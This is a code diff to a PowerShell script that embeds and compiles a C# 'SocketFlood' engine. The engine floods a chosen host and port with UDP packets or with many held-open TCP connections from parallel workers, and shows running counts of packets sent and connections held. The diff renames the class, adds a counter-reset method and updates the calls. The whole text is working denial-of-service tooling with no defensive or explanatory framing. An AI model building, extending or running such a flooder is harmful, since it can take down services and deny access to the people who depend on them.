@@ -72,7 +72,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 
-public static class SocketFlood
+public static class SocketFloodV2
 {
     public static volatile bool StopRequested;
     public static long UdpPacketsSent;
@@ -81,6 +81,17 @@ public static class SocketFlood
     public static long TcpConnectionsHeld;
     public static long TcpConnectFailures;
     public static string TcpLastErrorMessage;
+
+    public static void Reset()
+    {
+        StopRequested = false;
+        UdpPacketsSent = 0;
+        UdpSendFailures = 0;
+        UdpLastErrorMessage = null;
+        TcpConnectionsHeld = 0;
+        TcpConnectFailures = 0;
+        TcpLastErrorMessage = null;
+    }
     private static readonly ConcurrentBag<TcpClient> HeldClients = new ConcurrentBag<TcpClient>();
 
     public static void FloodUdp(IPAddress target, int port, int packetSizeBytes, int workerCount)
@@ -163,7 +174,8 @@ public static class SocketFlood
 }
 "@
 # a previous run in the same session leaves the type loaded; only compile when it is absent
-if (-not ('SocketFlood' -as [type])) {
+# bump the version suffix whenever the engine source changes so stale types are not reused
+if (-not ('SocketFloodV2' -as [type])) {
     try {
         Add-Type -TypeDefinition $flood_source -Language CSharp
     } catch {
@@ -180,33 +192,35 @@ if (-not ('SocketFlood' -as [type])) {
 
 if ($protocol -eq "TCP") {
     Write-Host "Flooding $host_address`:$port_number with TCP connections from $worker_count parallel workers (Ctrl+C to stop and release)..." -ForegroundColor Yellow
-    [SocketFlood]::FloodTcp($target_ip_address, $port_number, $worker_count)
+    [SocketFloodV2]::Reset()
+    [SocketFloodV2]::FloodTcp($target_ip_address, $port_number, $worker_count)
     try {
         while ($true) {
             Start-Sleep -Seconds 1
-            Write-Host ("Held open: {0:N0} connections" -f [SocketFlood]::TcpConnectionsHeld)
-            if ([SocketFlood]::TcpConnectFailures -gt 0) {
-                Write-Host ("Connect failures: {0:N0} - last error: {1}" -f [SocketFlood]::TcpConnectFailures, [SocketFlood]::TcpLastErrorMessage) -ForegroundColor DarkYellow
+            Write-Host ("Held open: {0:N0} connections" -f [SocketFloodV2]::TcpConnectionsHeld)
+            if ([SocketFloodV2]::TcpConnectFailures -gt 0) {
+                Write-Host ("Connect failures: {0:N0} - last error: {1}" -f [SocketFloodV2]::TcpConnectFailures, [SocketFloodV2]::TcpLastErrorMessage) -ForegroundColor DarkYellow
             }
         }
     } finally {
-        [SocketFlood]::StopRequested = $true
+        [SocketFloodV2]::StopRequested = $true
         Start-Sleep -Milliseconds 300
-        [SocketFlood]::ReleaseTcpConnections()
+        [SocketFloodV2]::ReleaseTcpConnections()
         Write-Host "Connections released" -ForegroundColor Yellow
     }
 } else {
     Write-Host "Flooding $host_address`:$port_number with UDP packets from $worker_count parallel workers (Ctrl+C to stop)..." -ForegroundColor Yellow
-    [SocketFlood]::FloodUdp($target_ip_address, $port_number, $udp_packet_size_bytes, $worker_count)
+    [SocketFloodV2]::Reset()
+    [SocketFloodV2]::FloodUdp($target_ip_address, $port_number, $udp_packet_size_bytes, $worker_count)
     try {
         while ($true) {
             Start-Sleep -Seconds 1
-            Write-Host ("Sent: {0:N0} packets" -f [SocketFlood]::UdpPacketsSent)
-            if ([SocketFlood]::UdpSendFailures -gt 0) {
-                Write-Host ("Send failures: {0:N0} - last error: {1}" -f [SocketFlood]::UdpSendFailures, [SocketFlood]::UdpLastErrorMessage) -ForegroundColor DarkYellow
+            Write-Host ("Sent: {0:N0} packets" -f [SocketFloodV2]::UdpPacketsSent)
+            if ([SocketFloodV2]::UdpSendFailures -gt 0) {
+                Write-Host ("Send failures: {0:N0} - last error: {1}" -f [SocketFloodV2]::UdpSendFailures, [SocketFloodV2]::UdpLastErrorMessage) -ForegroundColor DarkYellow
             }
         }
     } finally {
-        [SocketFlood]::StopRequested = $true
+        [SocketFloodV2]::StopRequested = $true
     }
 }
